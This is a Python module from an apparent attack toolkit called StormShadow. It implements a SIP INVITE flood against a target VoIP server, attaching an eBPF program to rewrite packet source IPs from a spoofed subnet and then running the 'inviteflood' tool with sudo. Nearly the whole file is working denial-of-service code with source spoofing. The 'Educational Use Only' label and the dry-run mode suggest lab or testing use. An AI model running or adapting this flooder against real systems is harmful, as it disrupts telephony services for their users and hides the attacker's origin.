"""
eBPF-based InviteFlood Attack Module.

This module implements a high-performance SIP InviteFlood attack with eBPF-based IP spoofing.
It uses kernel-space packet modification for superior performance compared to userspace approaches.
"""

from pathlib import Path
from typing import List, Optional, Any
import time
from utils.core.logs import print_error, print_info, print_success
from utils.interfaces.attack_interface import AttackInterface
from utils.registry.metadata import ModuleInfo
from utils.core.command_runner import run_command_str
from sip_attacks.eBPF.ebpf_sip_spoofing import EbpfSipPacketSpoofer


class InviteFloodAttackEbpf(AttackInterface):
    """
    eBPF-based SIP INVITE Flood Attack Module.
    
    This class implements a SIP INVITE flood attack with high-performance eBPF-based
    IP spoofing capabilities. It uses kernel-space packet modification for superior
    performance compared to userspace approaches.
    """

    # Module information for the registry
    infos: ModuleInfo = ModuleInfo(
        description="eBPF-based SIP INVITE Flood Attack Module using kernel-space IP spoofing",
        version="2.0.0",
        author="StormShadow",
        requirements=["inviteflood", "tc", "bpftool", "clang"],
        license="Educational Use Only"
    )

    def __init__(self, 
                 target_ip: str = "127.0.0.1",
                 rate: int = 0,
                 delay: float = 0.0,
                 target_port: int = 5060,
                 interface: str = "eth0",
                 source_port: int = 0,
                 attack_queue_num: int = 1,
                 max_count: int = 0,
                 max_duration: int = 0,
                 user_agent: str = "StormShadow",
                 spoofing_subnet: Optional[str] = None,
                 custom_payload_path: Optional[Path] = None,
                 sip_users: List[int] = [],
                 open_window: bool = False,
                 **kwargs: Any) -> None:
        """Initialize the attack with parameters."""
 
        # Call the parent class constructor
        super().__init__(
            target_ip=target_ip,
            rate=rate,
            delay=delay,
            target_port=target_port,
            interface=interface,
            source_port=source_port,
            attack_queue_num=attack_queue_num,
            max_count=max_count,
            max_duration=max_duration,
            user_agent=user_agent,
            spoofing_subnet=spoofing_subnet,
            custom_payload_path=custom_payload_path,
            sip_users=sip_users,
            open_window=open_window
        )

        # Store spoofing parameters
        self.spoofing_subnet = spoofing_subnet or '10.10.122.0/25'
        
        # Set dry_run parameter after initialization
        self.dry_run = kwargs.get('dry_run', False)
        
        # Mark dry run and spoofing as implemented
        self.dry_run_implemented = True
        self.spoofing_implemented = True
        
        # Initialize eBPF spoofer
        self.ebpf_spoofer: Optional[EbpfSipPacketSpoofer] = None
        
        print_info(f"eBPF InviteFlood attack initialized with target: {self.target_ip}:{self.target_port}")
        print_info(f"eBPF spoofing will use interface: {self.interface}")
        print_info(f"Spoofing subnet: {self.spoofing_subnet}")

    def start_ebpf_spoofing(self) -> bool:
        """
        Start eBPF-based packet spoofing.
        
        Returns:
            bool: True if spoofing started successfully, False otherwise
        """
        if self.dry_run:
            print_info("Dry run mode: would start eBPF spoofing")
            return True
        
        # Check if spoofing is already running
        if self.ebpf_spoofer is not None:
            print_info("eBPF spoofing is already running")
            return True
            
        try:
            self.ebpf_spoofer = EbpfSipPacketSpoofer(
                attack_queue_num=self.attack_queue_num,
                spoofed_subnet=self.spoofing_subnet or '10.10.122.0/25',
                victim_port=self.target_port,
                victim_ip=self.target_ip,
                attacker_port=self.source_port,
                interface=self.interface,
                open_window=self.open_window,
                dry_run=self.dry_run
            )
            
            if self.ebpf_spoofer.start_spoofing():
                print_info("eBPF spoofing started successfully")
                return True
            else:
                print_error("Failed to start eBPF spoofing")
                return False
        except Exception as e:
            print_error(f"Exception starting eBPF spoofing: {e}")
            return False

    def stop_ebpf_spoofing(self) -> bool:
        """
        Stop eBPF-based packet spoofing.
        
        Returns:
            bool: True if spoofing stopped successfully, False otherwise
        """
        if self.dry_run:
            print_info("Dry run mode: would stop eBPF spoofing")
            return True
            
        if self.ebpf_spoofer is not None:
            try:
                result = self.ebpf_spoofer.stop_spoofing()
                self.ebpf_spoofer = None
                print_info("eBPF spoofing stopped successfully")
                return result
            except Exception as e:
                print_error(f"Exception stopping eBPF spoofing: {e}")
                return False
        return True

    def start_spoofing(self) -> bool:
        """
        Override base class method to use eBPF spoofing.
        
        Returns:
            bool: True if spoofing started successfully, False otherwise
        """
        return self.start_ebpf_spoofing()

    def stop_spoofing(self) -> bool:
        """
        Override base class method to use eBPF spoofing.
        
        Returns:
            bool: True if spoofing stopped successfully, False otherwise
        """
        return self.stop_ebpf_spoofing()

    def cleanup(self) -> None:
        """Clean up attack resources."""
        print_info("Cleaning up eBPF InviteFlood attack resources")
        self.stop_ebpf_spoofing()

    def end(self):
        """End the attack and cleanup."""
        print_info("Ending the eBPF InviteFlood attack")
        print_info("Cleaning up resources used by the eBPF InviteFlood attack")
        self.cleanup()

    def run(self) -> None:
        """Execute the InviteFlood attack with eBPF-based IP spoofing."""
        print_info("Running eBPF InviteFlood attack with kernel-space packet spoofing")
        
        if self.dry_run:
            print_info("Dry run mode: would execute inviteflood with eBPF spoofing")
            print_info(f"Would attack target: {self.target_ip}:{self.target_port}")
            print_info(f"Would use eBPF spoofing with subnet: {self.spoofing_subnet}")
            print_info(f"Would use interface: {self.interface}")
            return
            
        try:
            # Check if eBPF spoofing is already running (started by AttackSession)
            if self.ebpf_spoofer is None:
                # Start eBPF spoofing if not already started
                if not self.start_ebpf_spoofing():
                    print_error("Failed to start eBPF spoofing, aborting attack")
                    return
            else:
                print_info("eBPF spoofing already active (started by session)")
                
            print_info(f"eBPF spoofing active on interface {self.interface}")
            print_info(f"Packets to {self.target_ip}:{self.target_port} will be spoofed with IPs from {self.spoofing_subnet}")
            
            # Wait a moment for eBPF program to be fully loaded
            time.sleep(0.5)
            
            # Now run inviteflood - the eBPF program will automatically spoof the packets
            print_info(f"Sending {self.max_count} INVITE packets (eBPF will spoof source IPs)")
            
            # Build inviteflood command - no need to specify source IP since eBPF handles it
            command = (
                f"inviteflood "
                f"{self.interface} "
                f"200 "  # target user
                f"{self.target_ip} "  # target domain (using IP)
                f"{self.target_ip} "  # IPv4 addr of flood target
                f"{self.max_count} "  # number of packets
                f"-S {self.source_port} "  # source port
                f"-D {self.target_port} "  # destination port
                f"-s {self.delay} "  # delay between packets
            )
            
            print_info(f"Executing command: {command}")
            
            try:
                # Run inviteflood - eBPF will handle the spoofing
                run_command_str(command, want_sudo=True, capture_output=False, check=True)
                print_success(f"Successfully sent {self.max_count} packets with eBPF spoofing")
                    
            except Exception as e:
                print_error(f"Failed to run inviteflood: {e}")
                
        except Exception as e:
            print_error(f"Failed to run eBPF InviteFlood attack: {e}")
        finally:
            # Don't stop spoofing here if it was started by AttackSession
            # AttackSession will handle stopping it properly
            pass

    def stop(self) -> None:
        """Stop the attack."""
        print_info("Stopping eBPF InviteFlood attack")
        print_info("Ending the attack and cleanup resources by default")
        self.end()
    
    def get_attack_description(self) -> str:
        """Get attack description."""
        return ("This is an eBPF-based InviteFlood attack module that uses high-performance kernel-space "
                "packet spoofing. It attaches an eBPF program to the network interface that automatically "
                "modifies SIP INVITE packets with different source IP addresses from a specified subnet, "
                "providing superior performance compared to userspace approaches.")
